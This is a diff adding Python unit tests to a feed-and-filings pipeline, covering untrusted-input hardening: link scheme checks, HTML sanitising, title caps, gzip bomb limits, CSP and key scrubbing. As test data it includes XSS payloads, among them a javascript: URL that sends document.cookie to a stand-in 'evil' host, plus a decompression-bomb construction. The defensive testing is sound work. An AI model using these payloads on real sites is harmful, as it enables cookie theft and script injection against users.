@@ -290,5 +290,102 @@ class EdgarIntegrationTests(unittest.TestCase):
                          "https://www.sec.gov/acme")
 
 
+class UntrustedInputHardeningTests(unittest.TestCase):
+    """Controls added after the Sep 2026 security review. Every one of these
+    guards a path where text written by a stranger reaches the public page or
+    the unattended runner."""
+
+    def test_only_http_and_https_may_become_a_link(self):
+        for good in ("https://example.com/a", "http://example.com/b",
+                     "HTTPS://EXAMPLE.COM/c"):
+            self.assertEqual(pipeline.safe_link(good), good)
+
+    def test_script_bearing_urls_are_rejected(self):
+        # escaping does NOT neutralise these: the browser decodes the entities
+        # back before using the address, so the scheme must be checked instead
+        for bad in ("javascript:fetch('https://evil/'+document.cookie)",
+                    "JaVaScRiPt:alert(1)",
+                    "data:text/html,<script>alert(1)</script>",
+                    "vbscript:msgbox(1)", "  javascript:alert(1)  "):
+            self.assertEqual(pipeline.safe_link(bad), "")
+
+    def test_missing_or_unparseable_links_become_empty(self):
+        for junk in (None, "", "   ", "http://[unclosed"):
+            self.assertEqual(pipeline.safe_link(junk), "")
+
+    def test_feed_items_carry_only_safe_links(self):
+        xml = b"""<rss><channel>
+          <item><title>Hostile headline about a company</title>
+                <link>javascript:alert(1)</link></item>
+          <item><title>Ordinary headline about a company</title>
+                <link>https://example.com/ok</link></item>
+        </channel></rss>"""
+        items = pipeline.parse_feed(xml, "Src", "markets", 1.0)
+        self.assertEqual([i["link"] for i in items], ["", "https://example.com/ok"])
+
+    def test_titles_are_length_capped_at_ingest(self):
+        # an uncapped title drives the filing-title regex into heavy backtracking
+        xml = ("<rss><channel><item><title>" + "A - " * 5000
+               + "</title><link>https://e.com</link></item></channel></rss>")
+        items = pipeline.parse_feed(xml.encode(), "Src", "markets", 1.0)
+        self.assertLessEqual(len(items[0]["title"]), pipeline.MAX_TITLE_CHARS)
+
+    def test_summary_unescapes_before_stripping_tags(self):
+        # the other order lets "&lt;script&gt;" survive as live markup
+        self.assertNotIn("<script>",
+                         pipeline._clean_summary("&lt;script&gt;alert(1)&lt;/script&gt;"))
+
+    def test_oversized_decompression_is_refused(self):
+        import zlib
+        bomb = zlib.compressobj(9, zlib.DEFLATED, 16 + zlib.MAX_WBITS)
+        blob = bomb.compress(b"\0" * (4 * 1024 * 1024)) + bomb.flush()
+        with self.assertRaises(ValueError):
+            pipeline._gunzip(blob, limit=1024)
+
+    def test_normal_gzip_still_round_trips(self):
+        import gzip as _gz
+        self.assertEqual(pipeline._gunzip(_gz.compress(b"hello feed")), b"hello feed")
+
+    def test_the_page_forbids_scripts(self):
+        self.assertIn("default-src 'none'", pipeline.CSP)
+
+    def test_error_text_never_carries_a_key(self):
+        original = smallcap.read_key
+        smallcap.read_key = lambda env, fname: "SECRETKEY1234567890"
+        try:
+            scrubbed = pipeline._scrub(
+                "HTTP error for https://api/x?token=SECRETKEY1234567890")
+            self.assertNotIn("SECRETKEY1234567890", scrubbed)
+            self.assertIn("***", scrubbed)
+        finally:
+            smallcap.read_key = original
+
+
+class VendorTypeConfusionTests(unittest.TestCase):
+    """Vendor fields are written into a committed cache, so a bad type would
+    persist across runs and raise on every later one."""
+
+    def test_non_numeric_market_cap_does_not_put_a_company_in_band(self):
+        for junk in ("1200", None, "", [], {}, True):
+            self.assertFalse(smallcap.in_band({"mcap": junk, "exch": "NASDAQ"}))
+
+    def test_a_valid_market_cap_still_qualifies(self):
+        self.assertTrue(smallcap.in_band({"mcap": 800.0, "exch": "NASDAQ"}))
+
+    def test_non_string_exchange_does_not_raise(self):
+        self.assertTrue(smallcap.in_band({"mcap": 800.0, "exch": None}))
+
+    def test_numbers_are_coerced_or_discarded(self):
+        self.assertEqual(smallcap._num("1200"), 1200.0)
+        self.assertEqual(smallcap._num(1200), 1200.0)
+        for junk in ("abc", None, "", [], {}):
+            self.assertIsNone(smallcap._num(junk))
+
+    def test_text_fields_are_never_sliced_blindly(self):
+        self.assertEqual(smallcap._txt(1234, 60), "1234")
+        self.assertEqual(smallcap._txt(None, 60), "")
+        self.assertEqual(smallcap._txt("abcdef", 3), "abc")
+
+
 if __name__ == "__main__":
     unittest.main()
